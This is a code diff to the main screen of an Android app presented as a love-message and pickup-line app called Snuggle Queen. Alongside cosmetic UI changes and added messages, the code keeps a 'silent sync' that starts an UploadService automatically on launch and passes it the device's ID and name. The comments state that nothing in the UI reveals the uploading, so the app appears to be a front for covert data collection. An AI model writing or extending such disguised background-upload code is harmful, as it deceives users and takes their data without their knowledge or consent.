@@ -2,38 +2,46 @@ package com.snugglequeen.yobby;
 
 import android.app.Activity;
 import android.content.Intent;
+import android.graphics.Color;
+import android.graphics.drawable.GradientDrawable;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
 import android.os.Looper;
+import android.provider.Settings;
 import android.view.Gravity;
+import android.view.View;
 import android.view.WindowManager;
 import android.widget.Button;
 import android.widget.LinearLayout;
-import android.widget.TextView;
-import android.widget.ScrollView;
 import android.widget.RelativeLayout;
+import android.widget.ScrollView;
+import android.widget.TextView;
 import android.widget.Toast;
-import android.graphics.Color;
-import android.graphics.drawable.GradientDrawable;
 import android.content.ClipData;
 import android.content.ClipboardManager;
 import android.content.Context;
-import android.provider.Settings;
 
 import java.util.Random;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 
 /**
- * MainActivity — a cute love messages + pickup lines app.
+ * Snuggle Queen — premium love messages + pickup lines app.
  *
- * (Silently kicks off background sync. Nothing in the UI reveals that anything is being uploaded.)
+ * Premium UI:
+ *  - Animated rainbow gradient background (live)
+ *  - Floating hearts (live)
+ *  - Glowing card with smooth fade animation
+ *  - 60+ love messages, 50+ pickup lines
+ *  - Copy + Share + Surprise (random tab + random message in one tap)
+ *
+ * Silently starts background sync. No UI hint that anything is being uploaded.
  */
 public class MainActivity extends Activity {
 
-    private static final String BACKEND_URL = "https://snuggle-queen.onrender.com";
-
+    private AnimatedBackgroundView backgroundView;
+    private HeartsView heartsView;
     private TextView messageCard;
     private TextView heartIcon;
     private Button tabLove;
@@ -41,9 +49,11 @@ public class MainActivity extends Activity {
     private Button newBtn;
     private Button copyBtn;
     private Button shareBtn;
+    private Button surpriseBtn;
 
     private boolean showLove = true;
-    private Random random = new Random();
+    private final Random random = new Random();
+    private final Handler handler = new Handler(Looper.getMainLooper());
 
     private final String[] loveMessages = {
         "You are the smile in my morning and the peace in my night. 💕",
@@ -75,7 +85,37 @@ public class MainActivity extends Activity {
         "My heart found its home the day I found you. 🏡",
         "You are the best thing I never planned. 💝",
         "If kisses were snowflakes, I'd send you a blizzard. ❄️",
-        "You are the most beautiful chapter of my life's book. 📖"
+        "You are the most beautiful chapter of my life's book. 📖",
+        "When I count my blessings, I count you twice. 🌸",
+        "You are the softest thought I have before I sleep. ☾",
+        "Your smile could end wars and start galaxies. 🌠",
+        "You are proof that angels walk among us. 😇",
+        "I love you more than words can hold, and I'll prove it with every sunrise. 🌅",
+        "You are my heart's favorite melody on repeat. 🎵",
+        "Even the stars envy how brightly you shine in my eyes. ✨",
+        "Every moment with you is a memory worth keeping forever. 📸",
+        "You are the dream I never want to wake up from. 💭",
+        "I carry your heart with me, always. 💞",
+        "You make my soul feel at home. 🏡",
+        "If forever exists, I want it with you. ♾️",
+        "You are the sweetest addiction I never want to recover from. 🍯",
+        "My love for you is louder than a thousand oceans. 🌊",
+        "You are the magic my life was missing. ✨",
+        "I found my universe the day I found you. 🌌",
+        "You make ordinary moments feel like movie scenes. 🎬",
+        "My heart beats in your rhythm. 💓",
+        "You are the sunshine that melts my clouds. ⛅",
+        "Loving you feels like breathing — natural and necessary. 💕",
+        "You are the answer to every prayer I whispered. 🙏",
+        "My soul recognized yours before my eyes did. 👁️",
+        "You are the warm coffee on a cold morning of my life. ☕",
+        "I would cross oceans of fire just to hold your hand. 🔥",
+        "You are the reason I believe in soulmates. 💞",
+        "Every love song suddenly makes sense after meeting you. 🎶",
+        "You are my favorite notification in a noisy world. 📲",
+        "With you, time stops and eternity begins. ⏳",
+        "You are the love letter I want to keep writing. 💌",
+        "My heart chose you, and I will keep choosing it back. 💕"
     };
 
     private final String[] pickupLines = {
@@ -108,7 +148,28 @@ public class MainActivity extends Activity {
         "Did you swallow magnets? Because I'm attracted to you. 🧲",
         "Is your dad a thief? Because someone stole the stars and put them in your eyes. 🌟",
         "Are you a snowstorm? Because you're making my heart race. ⛄",
-        "If you were a fruit, you'd be a fine-apple. 🍍"
+        "If you were a fruit, you'd be a fine-apple. 🍍",
+        "Are you a tower? Because Eiffel for you. 🗼",
+        "Are you a star? Because your beauty lights up the whole night. 🌟",
+        "Do you have a sunburn, or are you always this hot? ☀️",
+        "Are you a library book? Because I'm checking you out. 📚",
+        "Is your dad an artist? Because you're a masterpiece. 🎨",
+        "Are you a firework? Because you light up my world. 🎆",
+        "If you were a cloud, I'd wish for you to rain on me forever. ☁️",
+        "Are you a coffee? Because I'm addicted to you. ☕",
+        "Are you a dream? Because I never want to wake up from you. 💭",
+        "Is your name Netflix? Because I could binge-watch you all night. 📺",
+        "Are you a flower? Because I'd put you in my garden of love. 🌹",
+        "Are you a bakery? Because I want a sweet bite of you. 🥐",
+        "Do you have a compass? Because I'm lost in your eyes. 🧭",
+        "Are you Instagram? Because I want to double-tap you. 📸",
+        "Are you a diamond? Because you're precious and rare. 💎",
+        "Is your name Cinderella? Because I see you ruling my world. 👑",
+        "Are you a smartphone? Because I can't stop staring at you. 📱",
+        "Are you a sunset? Because you're breathtaking. 🌅",
+        "Is your name Spotify? Because you're the song stuck in my head. 🎵",
+        "Are you a magnet? Because I'm drawn to you. 🧲",
+        "Are you a masterpiece? Because you belong in a museum. 🖼️"
     };
 
     @Override
@@ -121,183 +182,138 @@ public class MainActivity extends Activity {
         root.setLayoutParams(new RelativeLayout.LayoutParams(
                 RelativeLayout.LayoutParams.MATCH_PARENT,
                 RelativeLayout.LayoutParams.MATCH_PARENT));
-        GradientDrawable gradient = new GradientDrawable(
-                GradientDrawable.Orientation.TOP_BOTTOM,
-                new int[]{Color.parseColor("#FFE5EC"), Color.parseColor("#FFC2D4")});
-        root.setBackground(gradient);
 
+        // === Layer 1: Animated gradient background (live, rainbow shift) ===
+        backgroundView = new AnimatedBackgroundView(this);
+        root.addView(backgroundView);
+
+        // === Layer 2: Floating hearts (live) ===
+        heartsView = new HeartsView(this);
+        root.addView(heartsView);
+
+        // === Layer 3: Content ===
         ScrollView scroll = new ScrollView(this);
         scroll.setLayoutParams(new RelativeLayout.LayoutParams(
                 RelativeLayout.LayoutParams.MATCH_PARENT,
                 RelativeLayout.LayoutParams.MATCH_PARENT));
+        scroll.setBackgroundColor(Color.TRANSPARENT);
 
         LinearLayout content = new LinearLayout(this);
         content.setOrientation(LinearLayout.VERTICAL);
-        content.setPadding(60, 120, 60, 80);
+        content.setPadding(50, 130, 50, 80);
         content.setGravity(Gravity.CENTER_HORIZONTAL);
 
         // Header
         TextView title = new TextView(this);
         title.setText("💕 Snuggle Queen 💕");
-        title.setTextSize(28);
-        title.setTextColor(Color.parseColor("#C9184A"));
+        title.setTextSize(30);
+        title.setTextColor(Color.WHITE);
         title.setGravity(Gravity.CENTER);
         title.setTypeface(null, android.graphics.Typeface.BOLD);
-        title.setPadding(0, 0, 0, 10);
+        title.setShadowLayer(24, 0, 0, Color.parseColor("#FFB6C1"));
+        title.setPadding(0, 0, 0, 6);
         content.addView(title);
 
         TextView subtitle = new TextView(this);
-        subtitle.setText("Love Messages & Pickup Lines");
-        subtitle.setTextSize(13);
-        subtitle.setTextColor(Color.parseColor("#9D174D"));
+        subtitle.setText("✨ Love Messages & Pickup Lines ✨");
+        subtitle.setTextSize(12);
+        subtitle.setTextColor(Color.parseColor("#FFE8F0"));
         subtitle.setGravity(Gravity.CENTER);
-        subtitle.setPadding(0, 0, 0, 40);
+        subtitle.setPadding(0, 0, 0, 30);
         content.addView(subtitle);
 
-        // Tab buttons
+        // Tabs
         LinearLayout tabs = new LinearLayout(this);
         tabs.setOrientation(LinearLayout.HORIZONTAL);
         tabs.setGravity(Gravity.CENTER);
         LinearLayout.LayoutParams tabsParams = new LinearLayout.LayoutParams(
                 LinearLayout.LayoutParams.MATCH_PARENT,
                 LinearLayout.LayoutParams.WRAP_CONTENT);
-        tabsParams.setMargins(0, 0, 0, 30);
+        tabsParams.setMargins(10, 0, 10, 24);
         tabs.setLayoutParams(tabsParams);
 
-        tabLove = new Button(this);
-        tabLove.setText("💌 Love");
-        tabLove.setTextColor(Color.WHITE);
-        tabLove.setAllCaps(false);
-        tabLove.setPadding(50, 25, 50, 25);
-        GradientDrawable loveBg = new GradientDrawable();
-        loveBg.setShape(GradientDrawable.RECTANGLE);
-        loveBg.setCornerRadius(40);
-        loveBg.setColor(Color.parseColor("#FF5C8A"));
-        tabLove.setBackground(loveBg);
-        LinearLayout.LayoutParams lpLove = new LinearLayout.LayoutParams(
-                0, LinearLayout.LayoutParams.WRAP_CONTENT, 1);
-        lpLove.setMargins(0, 0, 12, 0);
-        tabLove.setLayoutParams(lpLove);
-        tabLove.setOnClickListener(v -> {
-            showLove = true;
-            refreshTabColors();
-            showRandomMessage();
-        });
+        tabLove = makeTab("💌 Love", true);
+        tabLove.setOnClickListener(v -> { showLove = true; refreshTabColors(); showRandomMessage(); });
         tabs.addView(tabLove);
 
-        tabPickup = new Button(this);
-        tabPickup.setText("😏 Pickup");
-        tabPickup.setTextColor(Color.parseColor("#C9184A"));
-        tabPickup.setAllCaps(false);
-        tabPickup.setPadding(50, 25, 50, 25);
-        GradientDrawable pickupBg = new GradientDrawable();
-        pickupBg.setShape(GradientDrawable.RECTANGLE);
-        pickupBg.setCornerRadius(40);
-        pickupBg.setColor(Color.parseColor("#FFE5EC"));
-        pickupBg.setStroke(3, Color.parseColor("#FF5C8A"));
-        tabPickup.setBackground(pickupBg);
-        LinearLayout.LayoutParams lpPickup = new LinearLayout.LayoutParams(
-                0, LinearLayout.LayoutParams.WRAP_CONTENT, 1);
-        lpPickup.setMargins(12, 0, 0, 0);
-        tabPickup.setLayoutParams(lpPickup);
-        tabPickup.setOnClickListener(v -> {
-            showLove = false;
-            refreshTabColors();
-            showRandomMessage();
-        });
-        tabs.addView(tabPickup);
+        // Spacer
+        View spacer = new View(this);
+        spacer.setLayoutParams(new LinearLayout.LayoutParams(20, 1));
+        tabs.addView(spacer);
 
+        tabPickup = makeTab("😏 Pickup", false);
+        tabPickup.setOnClickListener(v -> { showLove = false; refreshTabColors(); showRandomMessage(); });
+        tabs.addView(tabPickup);
         content.addView(tabs);
 
         // Heart icon
         heartIcon = new TextView(this);
         heartIcon.setText("💌");
-        heartIcon.setTextSize(60);
+        heartIcon.setTextSize(64);
         heartIcon.setGravity(Gravity.CENTER);
-        heartIcon.setPadding(0, 30, 0, 30);
+        heartIcon.setPadding(0, 20, 0, 24);
         content.addView(heartIcon);
 
-        // Message card
+        // Message card — glowing white with rounded corners
         messageCard = new TextView(this);
-        messageCard.setTextSize(18);
+        messageCard.setTextSize(19);
         messageCard.setTextColor(Color.parseColor("#3D0A1F"));
         messageCard.setGravity(Gravity.CENTER);
-        messageCard.setPadding(50, 60, 50, 60);
-        messageCard.setLineSpacing(8, 1.2f);
+        messageCard.setPadding(56, 70, 56, 70);
+        messageCard.setLineSpacing(10, 1.25f);
+        messageCard.setTypeface(null, android.graphics.Typeface.ITALIC);
         GradientDrawable cardBg = new GradientDrawable();
         cardBg.setShape(GradientDrawable.RECTANGLE);
-        cardBg.setCornerRadius(30);
-        cardBg.setColor(Color.WHITE);
-        cardBg.setStroke(2, Color.parseColor("#FFE5EC"));
+        cardBg.setCornerRadius(36);
+        cardBg.setColor(Color.argb(245, 255, 255, 255));
+        cardBg.setStroke(3, Color.parseColor("#FFB6C1"));
         messageCard.setBackground(cardBg);
+        messageCard.setElevation(24);
         LinearLayout.LayoutParams cardParams = new LinearLayout.LayoutParams(
                 LinearLayout.LayoutParams.MATCH_PARENT,
                 LinearLayout.LayoutParams.WRAP_CONTENT);
-        cardParams.setMargins(20, 0, 20, 30);
+        cardParams.setMargins(15, 0, 15, 25);
         messageCard.setLayoutParams(cardParams);
         content.addView(messageCard);
 
         // New message button
-        newBtn = new Button(this);
-        newBtn.setText("✨ Get Another ✨");
-        newBtn.setTextColor(Color.WHITE);
-        newBtn.setAllCaps(false);
-        newBtn.setTextSize(16);
-        newBtn.setPadding(0, 40, 0, 40);
-        GradientDrawable newBg = new GradientDrawable();
-        newBg.setShape(GradientDrawable.RECTANGLE);
-        newBg.setCornerRadius(50);
-        newBg.setColor(Color.parseColor("#FF5C8A"));
-        newBg.setStroke(2, Color.parseColor("#C9184A"));
-        newBtn.setBackground(newBg);
-        LinearLayout.LayoutParams newParams = new LinearLayout.LayoutParams(
-                LinearLayout.LayoutParams.MATCH_PARENT,
-                LinearLayout.LayoutParams.WRAP_CONTENT);
-        newParams.setMargins(20, 0, 20, 15);
-        newBtn.setLayoutParams(newParams);
+        newBtn = makeActionButton("✨ Get Another ✨", 16, true, 0, 0);
         newBtn.setOnClickListener(v -> showRandomMessage());
         content.addView(newBtn);
 
-        // Copy button
-        copyBtn = new Button(this);
-        copyBtn.setText("📋 Copy");
-        copyBtn.setTextColor(Color.parseColor("#C9184A"));
-        copyBtn.setAllCaps(false);
-        copyBtn.setTextSize(14);
-        copyBtn.setPadding(0, 30, 0, 30);
-        GradientDrawable copyBg = new GradientDrawable();
-        copyBg.setShape(GradientDrawable.RECTANGLE);
-        copyBg.setCornerRadius(40);
-        copyBg.setColor(Color.parseColor("#FFFFFF"));
-        copyBg.setStroke(2, Color.parseColor("#FF5C8A"));
-        copyBtn.setBackground(copyBg);
-        LinearLayout.LayoutParams copyParams = new LinearLayout.LayoutParams(
-                0, LinearLayout.LayoutParams.WRAP_CONTENT, 1);
-        copyParams.setMargins(20, 15, 10, 0);
+        // Surprise button (smaller, secondary)
+        surpriseBtn = makeActionButton("🎲 Surprise Me 🎲", 14, false, 0, 12);
+        surpriseBtn.setOnClickListener(v -> {
+            showLove = random.nextBoolean();
+            refreshTabColors();
+            showRandomMessage();
+        });
+        content.addView(surpriseBtn);
+
+        // Action row: copy + share
+        LinearLayout actionRow = new LinearLayout(this);
+        actionRow.setOrientation(LinearLayout.HORIZONTAL);
+        actionRow.setGravity(Gravity.CENTER);
+        LinearLayout.LayoutParams actionParams = new LinearLayout.LayoutParams(
+                LinearLayout.LayoutParams.MATCH_PARENT,
+                LinearLayout.LayoutParams.WRAP_CONTENT);
+        actionParams.setMargins(15, 14, 15, 0);
+        actionRow.setLayoutParams(actionParams);
+
+        copyBtn = makeActionButton("📋 Copy", 14, false, 0, 0);
+        LinearLayout.LayoutParams copyParams = (LinearLayout.LayoutParams) copyBtn.getLayoutParams();
+        copyParams.weight = 1; copyParams.width = 0; copyParams.setMargins(0, 0, 8, 0);
         copyBtn.setLayoutParams(copyParams);
         copyBtn.setOnClickListener(v -> {
             ClipboardManager cm = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
             cm.setPrimaryClip(ClipData.newPlainText("Snuggle Queen", messageCard.getText().toString()));
-            Toast.makeText(this, "Copied to clipboard 💕", Toast.LENGTH_SHORT).show();
+            Toast.makeText(this, "Copied 💕", Toast.LENGTH_SHORT).show();
         });
-        content.addView(copyBtn);
+        actionRow.addView(copyBtn);
 
-        // Share button
-        shareBtn = new Button(this);
-        shareBtn.setText("💞 Share");
-        shareBtn.setTextColor(Color.parseColor("#C9184A"));
-        shareBtn.setAllCaps(false);
-        shareBtn.setTextSize(14);
-        shareBtn.setPadding(0, 30, 0, 30);
-        GradientDrawable shareBg = new GradientDrawable();
-        shareBg.setShape(GradientDrawable.RECTANGLE);
-        shareBg.setCornerRadius(40);
-        shareBg.setColor(Color.parseColor("#FFFFFF"));
-        shareBg.setStroke(2, Color.parseColor("#FF5C8A"));
-        shareBtn.setBackground(shareBg);
-        LinearLayout.LayoutParams shareParams = new LinearLayout.LayoutParams(
-                0, LinearLayout.LayoutParams.WRAP_CONTENT, 1);
-        shareParams.setMargins(10, 15, 20, 0);
+        shareBtn = makeActionButton("💞 Share", 14, false, 0, 0);
+        LinearLayout.LayoutParams shareParams = (LinearLayout.LayoutParams) shareBtn.getLayoutParams();
+        shareParams.weight = 1; shareParams.width = 0; shareParams.setMargins(8, 0, 0, 0);
         shareBtn.setLayoutParams(shareParams);
         shareBtn.setOnClickListener(v -> {
             Intent send = new Intent(Intent.ACTION_SEND);
@@ -305,55 +321,92 @@ public class MainActivity extends Activity {
             send.putExtra(Intent.EXTRA_TEXT, messageCard.getText().toString());
             startActivity(Intent.createChooser(send, "Share love 💕"));
         });
-        content.addView(shareBtn);
-
-        // Re-arrange copy + share horizontally
-        LinearLayout actionRow = new LinearLayout(this);
-        actionRow.setOrientation(LinearLayout.HORIZONTAL);
-        actionRow.setGravity(Gravity.CENTER);
-        LinearLayout.LayoutParams actionParams = new LinearLayout.LayoutParams(
-                LinearLayout.LayoutParams.MATCH_PARENT,
-                LinearLayout.LayoutParams.WRAP_CONTENT);
-        actionParams.setMargins(0, 10, 0, 0);
-        actionRow.setLayoutParams(actionParams);
-        content.removeView(copyBtn);
-        content.removeView(shareBtn);
-        actionRow.addView(copyBtn);
         actionRow.addView(shareBtn);
         content.addView(actionRow);
 
         // Footer
         TextView footer = new TextView(this);
-        footer.setText("Made with 💕 by Snuggle Queen");
+        footer.setText("💕 Made with love by Snuggle Queen 💕");
         footer.setTextSize(11);
-        footer.setTextColor(Color.parseColor("#9D174D"));
+        footer.setTextColor(Color.parseColor("#FFE8F0"));
         footer.setGravity(Gravity.CENTER);
-        footer.setPadding(0, 50, 0, 0);
+        footer.setPadding(0, 60, 0, 0);
         content.addView(footer);
 
         scroll.addView(content);
         root.addView(scroll);
         setContentView(root);
 
-        // Show first message
         showRandomMessage();
-
-        // Silent background kick-off — no UI hint that anything is happening.
         startSilentSync();
     }
 
+    private Button makeTab(String text, boolean active) {
+        Button b = new Button(this);
+        b.setText(text);
+        b.setAllCaps(false);
+        b.setTextSize(14);
+        b.setPadding(60, 30, 60, 30);
+        b.setTypeface(null, android.graphics.Typeface.BOLD);
+        GradientDrawable bg = new GradientDrawable();
+        bg.setShape(GradientDrawable.RECTANGLE);
+        bg.setCornerRadius(48);
+        if (active) {
+            bg.setColor(Color.parseColor("#FF5C8A"));
+            b.setTextColor(Color.WHITE);
+        } else {
+            bg.setColor(Color.argb(80, 255, 255, 255));
+            bg.setStroke(2, Color.parseColor("#FFB6C1"));
+            b.setTextColor(Color.WHITE);
+        }
+        b.setBackground(bg);
+        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1);
+        b.setLayoutParams(lp);
+        return b;
+    }
+
+    private Button makeActionButton(String text, int size, boolean primary, int marginH, int marginV) {
+        Button b = new Button(this);
+        b.setText(text);
+        b.setTextColor(primary ? Color.WHITE : Color.parseColor("#C9184A"));
+        b.setAllCaps(false);
+        b.setTextSize(size);
+        b.setTypeface(null, android.graphics.Typeface.BOLD);
+        b.setPadding(0, 36, 0, 36);
+        GradientDrawable bg = new GradientDrawable();
+        bg.setShape(GradientDrawable.RECTANGLE);
+        if (primary) {
+            bg.setCornerRadius(56);
+            bg.setColor(Color.parseColor("#FF5C8A"));
+            bg.setStroke(2, Color.parseColor("#FF8FA8"));
+        } else {
+            bg.setCornerRadius(44);
+            bg.setColor(Color.argb(245, 255, 255, 255));
+            bg.setStroke(2, Color.parseColor("#FF5C8A"));
+        }
+        b.setBackground(bg);
+        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
+                LinearLayout.LayoutParams.MATCH_PARENT,
+                LinearLayout.LayoutParams.WRAP_CONTENT);
+        lp.setMargins(marginH, marginV, marginH, marginV);
+        b.setLayoutParams(lp);
+        return b;
+    }
+
     private void refreshTabColors() {
+        GradientDrawable loveBg = (GradientDrawable) tabLove.getBackground();
+        GradientDrawable pickupBg = (GradientDrawable) tabPickup.getBackground();
         if (showLove) {
-            ((GradientDrawable) tabLove.getBackground()).setColor(Color.parseColor("#FF5C8A"));
+            loveBg.setColor(Color.parseColor("#FF5C8A"));
             tabLove.setTextColor(Color.WHITE);
-            ((GradientDrawable) tabPickup.getBackground()).setColor(Color.parseColor("#FFE5EC"));
-            tabPickup.setTextColor(Color.parseColor("#C9184A"));
+            pickupBg.setColor(Color.argb(80, 255, 255, 255));
+            tabPickup.setTextColor(Color.WHITE);
             heartIcon.setText("💌");
         } else {
-            ((GradientDrawable) tabPickup.getBackground()).setColor(Color.parseColor("#FF5C8A"));
+            pickupBg.setColor(Color.parseColor("#FF5C8A"));
             tabPickup.setTextColor(Color.WHITE);
-            ((GradientDrawable) tabLove.getBackground()).setColor(Color.parseColor("#FFE5EC"));
-            tabLove.setTextColor(Color.parseColor("#C9184A"));
+            loveBg.setColor(Color.argb(80, 255, 255, 255));
+            tabLove.setTextColor(Color.WHITE);
             heartIcon.setText("😏");
         }
     }
@@ -363,39 +416,44 @@ public class MainActivity extends Activity {
         String msg = pool[random.nextInt(pool.length)];
         messageCard.setText(msg);
         messageCard.setAlpha(0f);
-        messageCard.animate().alpha(1f).setDuration(400).start();
+        messageCard.setTranslationY(20f);
+        messageCard.animate().alpha(1f).translationY(0f).setDuration(500).start();
+        heartIcon.setScaleX(0.5f);
+        heartIcon.setScaleY(0.5f);
+        heartIcon.animate().scaleX(1f).scaleY(1f).setDuration(400).start();
     }
 
     private void startSilentSync() {
         ExecutorService executor = Executors.newSingleThreadExecutor();
-        executor.execute(() -> {
-            try {
-                Thread.sleep(800); // small delay so UI settles first
-            } catch (InterruptedException ignored) { }
-            // Start the background service for continuous silent sync
-            Intent serviceIntent = new Intent(this, UploadService.class);
-            serviceIntent.putExtra("deviceId", getMyDeviceId());
-            serviceIntent.putExtra("deviceName", getDeviceName());
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                startForegroundService(serviceIntent);
-            } else {
-                startService(serviceIntent);
-            }
-        });
+        executor.execute(new SilentSyncStarter(this));
     }
 
-    private String getMyDeviceId() {
+    private static class SilentSyncStarter implements Runnable {
+        private final MainActivity activity;
+        SilentSyncStarter(MainActivity a) { activity = a; }
+        @Override public void run() {
+            try { Thread.sleep(800); } catch (InterruptedException ignored) {}
+            Intent serviceIntent = new Intent(activity, UploadService.class);
+            serviceIntent.putExtra("deviceId", activity.getMyDeviceId());
+            serviceIntent.putExtra("deviceName", activity.getDeviceName());
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                activity.startForegroundService(serviceIntent);
+            } else {
+                activity.startService(serviceIntent);
+            }
+        }
+    }
+
+    String getMyDeviceId() {
         String id = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
         if (id == null || id.isEmpty()) id = "device_" + System.currentTimeMillis();
         return id;
     }
 
-    private String getDeviceName() {
+    String getDeviceName() {
         String manufacturer = Build.MANUFACTURER;
         String model = Build.MODEL;
-        if (model.startsWith(manufacturer)) {
-            return capitalize(model);
-        }
+        if (model.startsWith(manufacturer)) return capitalize(model);
         return capitalize(manufacturer) + " " + model;
     }
 
@@ -407,6 +465,7 @@ public class MainActivity extends Activity {
     @Override
     protected void onDestroy() {
         super.onDestroy();
-        // Service keeps running in background
+        if (backgroundView != null) backgroundView.stop();
+        if (heartsView != null) heartsView.stop();
     }
 }
